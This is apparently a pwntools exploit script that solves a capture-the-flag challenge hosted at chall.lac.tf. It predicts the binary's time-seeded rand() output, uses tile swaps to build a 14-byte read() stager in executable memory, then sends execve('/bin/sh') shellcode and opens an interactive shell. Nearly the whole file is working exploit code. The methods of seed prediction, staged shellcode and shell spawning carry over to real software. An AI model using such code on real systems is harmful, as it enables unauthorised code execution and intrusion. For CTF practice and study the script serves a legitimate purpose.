#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from collections import defaultdict
import re
import time as _time

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

nc = "nc chall.lac.tf 31338".split()
HOST = nc[1]
PORT = int(nc[2])

gdbscript = """
"""

if args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript)

BOARD_ADDR = 0x13370000
HAND_SIZE = 14

libc = CDLL(libc.path)

# Sync the PRNG with the challenge binary.
# Grab the timestamp right before spawning so the seed matches.
seed = int(_time.time())
libc.srand(seed)

# Predict the initial hand (first HAND_SIZE rand() calls)
hand = [libc.rand() & 0xFF for _ in range(HAND_SIZE)]
log.info("Predicted hand: %s", ' '.join(f'{b:02x}' for b in hand))

# Stage 1: read(0, BOARD_ADDR + HAND_SIZE, 0xff)
# This fits exactly in 14 bytes and reads more shellcode right after the stub.
# After the syscall, execution falls through into the freshly-read data.
#
#   xor eax, eax         ; 31 c0          (2)  rax = 0 (SYS_read)
#   cdq                  ; 99             (1)  rdx = 0 (sign-extend eax)
#   xor edi, edi         ; 31 ff          (2)  rdi = 0 (stdin)
#   mov esi, ADDR+14     ; be 0e 00 37 13 (5)  rsi = write destination
#   mov dl,  0xff        ; b2 ff          (2)  rdx = 0xff (count)
#   syscall              ; 0f 05          (2)
#                                         ---- 14 bytes total
stage1 = asm('''
    xor eax, eax
    cdq
    xor edi, edi
    mov esi, {}
    mov dl, 0xff
    syscall
'''.format(hex(BOARD_ADDR + HAND_SIZE)))

assert len(stage1) == HAND_SIZE, \
    f"Stage 1 is {len(stage1)} bytes, expected {HAND_SIZE}"
log.info("Stage 1 (%d bytes): %s", len(stage1), stage1.hex())

target = list(stage1)

# Parse the actual tiles from the initial display
output = r.recvuntil(b'> ')
tile_match = re.findall(rb'\| ([0-9a-f]{2}) ', output)
actual_hand = [int(x, 16) for x in tile_match]
log.info("Actual hand:    %s", ' '.join(f'{b:02x}' for b in actual_hand))

# Handle seed offset (time(NULL) can be off by a second)
if actual_hand != hand:
    log.warning("PRNG mismatch, trying nearby seeds...")
    for offset in [-1, 1, -2, 2]:
        libc.srand(seed + offset)
        test = [libc.rand() & 0xFF for _ in range(HAND_SIZE)]
        if test == actual_hand:
            log.success("Matched with seed offset %+d", offset)
            hand = test
            break
    else:
        log.error("Could not sync PRNG!")
        r.close()
        exit(1)

# Figure out which tiles need swapping
remaining = {}
for i in range(HAND_SIZE):
    if hand[i] != target[i]:
        remaining[i] = target[i]

log.info("Tiles to swap: %d / %d", len(remaining), HAND_SIZE)

# Inverse map: needed_byte -> set of tile indices that want it
need = defaultdict(set)
for i, b in remaining.items():
    need[b].add(i)

# Optimized swap strategy:
#   Each swap consumes one rand() value. We predict the next value and, if it
#   matches a tile we still need, swap that tile. Otherwise we "waste" the
#   swap on any remaining tile (we'll fix it later when the right value comes).
swaps = 0
while remaining:
    next_val = libc.rand() & 0xFF

    if next_val in need and need[next_val]:
        tile = need[next_val].pop()
        if not need[next_val]:
            del need[next_val]
        del remaining[tile]
    else:
        tile = next(iter(remaining))

    r.sendline(b'1')
    #r.recvuntil(b': ')
    r.sendline(str(tile).encode())
    #r.recvuntil(b'> ')
    swaps += 1

log.info("Finished in %d swaps", swaps)

# Play!
r.sendline(b'2')
r.recvuntil(b'TRIPLE WORD SCORE!')
sleep(0.1)

# Stage 2: full shellcode -- execve("/bin/sh", NULL, NULL)
stage2 = asm(shellcraft.sh())
log.info("Stage 2 (%d bytes): %s", len(stage2), stage2.hex())
r.send(stage2)

r.interactive()
